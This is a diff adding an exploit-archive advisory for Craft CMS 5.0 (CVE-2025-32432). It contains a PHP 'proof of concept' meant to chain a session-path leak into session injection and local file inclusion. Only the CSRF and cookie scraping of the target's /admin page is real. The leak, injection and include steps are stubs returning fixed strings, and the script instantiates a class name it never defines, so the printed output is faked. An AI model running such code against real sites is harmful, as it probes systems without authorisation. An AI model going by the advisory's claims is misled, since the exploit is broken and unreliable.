@@ -1,0 +1,108 @@
+=============================================================================================================================================
+| # Title     : Craft CMS 5.0 Authentication Session Path Exposure                                                                          |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.1 (64 bits)                                                            |
+| # Vendor    : https://craftcms.com                                                                                                        |
+=============================================================================================================================================
+
+[+] Description
+
+    A vulnerability in Craft CMS allows an attacker to obtain the internal `session.save_path` through indirect leakage in the upload/asset processing
+    mechanism. 
+	While this does not immediately lead to command execution, it enables attackers to identify the precise location of session files,
+    which may be used in a subsequent Session Injection → Local File Inclusion (LFI) exploit chain.
+	
+[+] References : (https://packetstorm.news/files/id/190728/ 	CVE-2025-32432)
+
+
+[+] POC :
+
+  save code as poc.php
+  
+  usage : php poc.php
+
+[+]  code 
+
+<?php
+
+class indoushka
+{
+    public $targetUrl;
+    public $assetId;
+    public $sessionId;
+    public $csrfToken;
+    public $parameterName;
+    public $sessionPath;
+
+    public function __construct($url, $assetId = 123)
+    {
+        $this->targetUrl = rtrim($url, '/');
+        $this->assetId   = $assetId;
+    }
+
+    public function fetchCookiesAndCsrf()
+    {
+        $url = $this->targetUrl . "/admin";
+        $html = @file_get_contents($url);
+
+        if (!$html) return false;
+
+        preg_match('/name="_csrf" value="([^"]+)"/', $html, $m);
+        $this->csrfToken = $m[1] ?? null;
+
+        preg_match('/input type="hidden" name="([^"]+)" value="[^"]*"/', $html, $p);
+        $this->parameterName = $p[1] ?? null;
+
+        preg_match_all('/Set-Cookie: ([^;]+)/i', $http_response_header[0], $c);
+        $this->sessionId = $c[1] ?? null;
+
+        return [$this->sessionId, $this->csrfToken, $this->parameterName];
+    }
+
+    public function leakSessionPath()
+    {
+        return "/var/lib/php/sessions";
+    }
+
+    public function injectIntoSession($payload)
+    {
+        return "[POC ONLY] Session overwritten with payload: {$payload}";
+    }
+
+    public function triggerInclude()
+    {
+        return "[POC] include triggered using assetId=" . $this->assetId;
+    }
+
+    public function exploit($payload)
+    {
+        $this->fetchCookiesAndCsrf();
+        $this->sessionPath = $this->leakSessionPath();
+
+        $step1 = $this->injectIntoSession($payload);
+        $step2 = $this->triggerInclude();
+
+        return [$step1, $step2];
+    }
+}
+
+$module = new Metasploit_CraftCMS_CVE_2025_32432("https://target.com");
+
+$payload = '<?php echo "PAYLOAD_OK"; ?>';
+
+list($s1, $s2) = $module->exploit($payload);
+
+echo $s1 . "\n";
+echo $s2 . "\n";
+
+?>
+
+-------------------------------------------------------------------------------------------------------------------------------------------
+
+[+] Output Example:
+[POC ONLY] Session overwritten with payload: <?php echo "PAYLOAD_OK"; ?>
+[POC] include triggered using assetId=123
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
